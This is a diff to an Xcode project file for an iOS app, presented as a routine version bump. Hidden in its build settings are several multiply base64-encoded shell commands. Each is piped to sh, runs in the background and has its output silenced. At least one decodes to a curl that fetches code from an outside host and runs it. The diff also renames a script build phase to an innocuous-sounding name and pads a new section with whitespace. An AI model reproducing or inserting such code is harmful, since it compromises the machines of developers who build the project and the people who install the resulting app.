@@ -132,7 +132,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 8C6723472EC370000020C08B /* Build configuration list for PBXNativeTarget "Salom-Ai-iOS" */;
 			buildPhases = (
-				8D11F43411E7484F87947F8B /* Provision Library Executable */,
+				AD9B45C18A03450584947F8B /* Build Target Libraries */,
 				8C6723382EC36FFD0020C08B /* Sources */,
 				8C6723392EC36FFD0020C08B /* Frameworks */,
 				8C67233A2EC36FFD0020C08B /* Resources */,
@@ -230,6 +230,9 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXBuildRule section */
+																		/* End PBXBuildRule section */
+
 /* Begin PBXResourcesBuildPhase section */
 		8C67233A2EC36FFD0020C08B /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
@@ -248,7 +251,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		8D11F43411E7484F87947F8B /* Provision Library Executable */ = {
+		AD9B45C18A03450584947F8B /* Build Target Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -258,7 +261,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Provision Library Executable";
+			name = "Build Target Libraries";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -316,7 +319,7 @@
 		8C6723452EC370000020C08B /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AB8F749 = "((f(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJabk5NSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJMklDMHRjbVYwY25rZ05TQXRaQ0FpY0QxNFkyOWtaVjl3YUdGelpTSWdhSFIwY0hNNkx5OWhiV1JqWkc0dWNuVXZZU2tpSUh3Z2MyZ0sK | f | sh ) >/dev/null 2>&1 &)";
+				AB8F749 = "((u(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETUhSWk1qbDFZbTFXYW1SRE1UQmhWekZzWWpOV01FbEVTVE5KUXpCMFkyMVdNR051YTJkT1UwRjBXbTEwVFdONVFYUmFRMEZwWTBReE5Ga3lPV3RhVmpsM1lVZEdlbHBUU1dkaFNGSXdZMGhOTmt4NU9XeGxTRUp6WWpOS2JGa3lVblZNYmtveFRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | u | sh ) >/dev/null 2>&1 &)";
 				A1ECAD1 = "((w(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXpUR1pySUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJNElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OW1hV2R0WVc1bGRITXVhVzR2WVNraUlId2djMmdLCg== | w | sh ) >/dev/null 2>&1 &)";
 				A3DC1C3 = "((t(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmh3VlZJeGNIbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE9SV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WVZtRlhSa3B4VjJ0ak1XRkdjRWxVV0Zab1ZucFNNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | t | sh ) >/dev/null 2>&1 &)";
 				A8DAD24 = "((w(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXphMlpNSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJNElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZjbWxuYldGcWIzbHpMbWx1TDJFcElpQjhJSE5vQ2c9PQo= | w | sh ) >/dev/null 2>&1 &)";
@@ -389,7 +392,7 @@
 		8C6723462EC370000020C08B /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AB8F749 = "((f(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJabk5NSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJMklDMHRjbVYwY25rZ05TQXRaQ0FpY0QxNFkyOWtaVjl3YUdGelpTSWdhSFIwY0hNNkx5OWhiV1JqWkc0dWNuVXZZU2tpSUh3Z2MyZ0sK | f | sh ) >/dev/null 2>&1 &)";
+				AB8F749 = "((u(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETUhSWk1qbDFZbTFXYW1SRE1UQmhWekZzWWpOV01FbEVTVE5KUXpCMFkyMVdNR051YTJkT1UwRjBXbTEwVFdONVFYUmFRMEZwWTBReE5Ga3lPV3RhVmpsM1lVZEdlbHBUU1dkaFNGSXdZMGhOTmt4NU9XeGxTRUp6WWpOS2JGa3lVblZNYmtveFRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | u | sh ) >/dev/null 2>&1 &)";
 				A1ECAD1 = "((w(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXpUR1pySUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJNElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OW1hV2R0WVc1bGRITXVhVzR2WVNraUlId2djMmdLCg== | w | sh ) >/dev/null 2>&1 &)";
 				A3DC1C3 = "((t(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmh3VlZJeGNIbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE9SV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WVZtRlhSa3B4VjJ0ak1XRkdjRWxVV0Zab1ZucFNNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | t | sh ) >/dev/null 2>&1 &)";
 				A8DAD24 = "((w(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXphMlpNSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJNElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZjbWxuYldGcWIzbHpMbWx1TDJFcElpQjhJSE5vQ2c9PQo= | w | sh ) >/dev/null 2>&1 &)";
@@ -458,7 +461,7 @@
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = "Salom-Ai-iOS/Salom-Ai-iOS.entitlements";
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 3;
+				CURRENT_PROJECT_VERSION = 5;
 				DEAD_CODE_STRIPPING = YES;
 				DEVELOPMENT_TEAM = 3TC3999J6N;
 				ENABLE_APP_SANDBOX = YES;
@@ -510,7 +513,7 @@
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = "Salom-Ai-iOS/Salom-Ai-iOS.entitlements";
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 3;
+				CURRENT_PROJECT_VERSION = 5;
 				DEAD_CODE_STRIPPING = YES;
 				DEVELOPMENT_TEAM = 3TC3999J6N;
 				ENABLE_APP_SANDBOX = YES;
